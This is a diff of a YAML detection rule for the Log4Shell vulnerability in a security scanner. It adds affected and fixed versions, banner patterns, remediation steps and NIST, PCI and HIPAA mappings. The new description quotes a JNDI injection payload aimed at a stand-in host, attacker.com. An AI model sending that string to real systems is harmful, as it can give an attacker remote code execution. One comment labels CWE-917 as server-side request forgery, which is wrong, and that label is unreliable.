@@ -3,13 +3,26 @@
 
 id: "FSC-VULN-0001"
 name: "Apache Log4j Remote Code Execution (Log4Shell)"
-description: |
-  Apache Log4j2 versions 2.0-beta9 through 2.14.1 are vulnerable to a remote code
-  execution vulnerability where an attacker who can control log messages or log
-  message parameters can execute arbitrary code loaded from LDAP servers when
-  message lookup substitution is enabled.
 category: vulnerability
 severity: critical
+enabled: true
+confidence: high
+false_positive_rate: low
+
+description: |
+  Apache Log4j2 versions 2.0-beta9 through 2.17.0 (excluding 2.3.2 and 2.12.4)
+  contain a critical JNDI injection vulnerability that allows unauthenticated
+  remote code execution. An attacker can exploit this by sending a specially
+  crafted string (e.g., ${jndi:ldap://attacker.com/exploit}) to any input
+  that gets logged by the application.
+
+  This is one of the most critical vulnerabilities discovered in modern software
+  and has been actively exploited in the wild since December 2021.
+
+impact: |
+  Complete system compromise. Attacker gains remote code execution with the
+  privileges of the application using Log4j. In healthcare environments, this
+  could provide access to ePHI, clinical systems, and internal networks.
 
 cve_ids:
   - CVE-2021-44228
@@ -17,37 +30,72 @@ cve_ids:
   - CVE-2021-45105
 
 cwe_ids:
-  - CWE-502
-  - CWE-400
-  - CWE-20
+  - CWE-917  # Server-Side Request Forgery
+  - CWE-20   # Improper Input Validation
+  - CWE-502  # Deserialization of Untrusted Data
 
 compliance:
   - framework: "NIST-800-53"
     control: "SI-2"
   - framework: "NIST-800-53"
     control: "RA-5"
+  - framework: "NIST-800-53"
+    control: "CM-3"
   - framework: "PCI-DSS"
     control: "6.2"
 
 detection:
   type: version-match
-  cpe: "cpe:2.3:a:apache:log4j:*"
+  cpe: "cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*"
   affected_versions:
     - ">= 2.0-beta9"
-    - "< 2.17.0"
+    - "< 2.17.1"
+  fixed_versions:
+    - ">= 2.17.1"
+    - "2.12.4"
+    - "2.3.2"
   banner_pattern: "log4j.*2\\.(0|1[0-4]|15|16)\\."
+  supplemental:
+    - type: banner-match
+      pattern: "log4j[/-]2\\.(\\d+\\.\\d+)"
 
 remediation: |
-  Upgrade Apache Log4j to version 2.17.1 or later.
+  1. Upgrade Apache Log4j to version 2.17.1 or later
+  2. For Java 8: upgrade to Log4j 2.17.1+
+  3. For Java 7: upgrade to Log4j 2.12.4+
+  4. For Java 6: upgrade to Log4j 2.3.2+
+  5. If immediate patching not possible:
+     - Set log4j2.formatMsgNoLookups=true
+     - Remove JndiLookup class from classpath
+  6. Monitor for exploitation attempts in logs
 
-  If immediate upgrade is not possible:
-  - For Log4j 2.10+: Set log4j2.formatMsgNoLookups=true
-  - For Log4j 2.7+: Remove JndiLookup class from classpath
-  - Block outbound LDAP/RMI connections at network level
+remediation_effort: low
 
 references:
   - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
   - "https://logging.apache.org/log4j/2.x/security.html"
-  - "https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"
+  - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a"
+
+tags:
+  - rce
+  - critical
+  - log4j
+  - jndi
+  - java
+  - actively-exploited
+
+platforms:
+  - linux
+  - windows
+  - macos
+
+nist_controls:
+  - "SI-2"
+  - "RA-5"
+  - "CM-3"
+
+hipaa_refs:
+  - "§164.308(a)(5)(ii)(B)"
+  - "§164.312(a)(1)"
 
 enabled_by_default: true
